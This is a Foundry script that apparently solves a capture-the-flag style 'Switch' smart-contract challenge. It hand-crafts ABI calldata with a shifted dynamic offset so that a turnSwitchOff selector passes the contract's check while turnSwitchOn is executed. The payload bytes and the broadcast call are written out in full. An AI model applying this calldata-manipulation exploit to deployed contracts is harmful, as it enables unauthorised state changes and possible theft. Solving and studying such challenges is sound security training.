// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";

interface ISwitch {
    function flipSwitch(bytes memory _data) external;
    function switchOn() external view returns (bool);
}

contract SwitchScript is Script {

    address switchAddress = 0x344851e017a0Ac956e0d89E21E64E7Cc6eBe255C;

    error SwitchNotOn();
    error CustomCallFailed();

    function run() public {
        vm.startBroadcast();

        /* 1. Construct special data to turn switch off
            0x
            30c13ade
            0000000000000000000000000000000000000000000000000000000000000060
            0000000000000000000000000000000000000000000000000000000000000000
            20606e1500000000000000000000000000000000000000000000000000000000
            0000000000000000000000000000000000000000000000000000000000000004
            76227e1200000000000000000000000000000000000000000000000000000000
        */
        bytes4 flipSelector_ = bytes4(keccak256("flipSwitch(bytes)")); // 30c13ade
        bytes32 offSelector_ = keccak256("turnSwitchOff()"); // 20606e15
        bytes32 onSelector_ = keccak256("turnSwitchOn()"); // 76227e12
        uint256 offset_ = 96; // We artificially increase the offset from 32 => 96
        uint256 padding_ = 1;
        uint256 length_ = 4; // Function selector is 4 bytes

        bytes memory customData_ = abi.encodePacked(flipSelector_, offset_, padding_, offSelector_, length_, onSelector_);

        console2.logBytes(customData_);

        // 2. Flip switch off with
        (bool success_, ) = switchAddress.call(customData_);
        if (!success_) {
            revert CustomCallFailed();
        }

        // 3.Check if switch is on
        if (!ISwitch(switchAddress).switchOn()) {
            revert SwitchNotOn();
        }

        vm.stopBroadcast();
    }
}
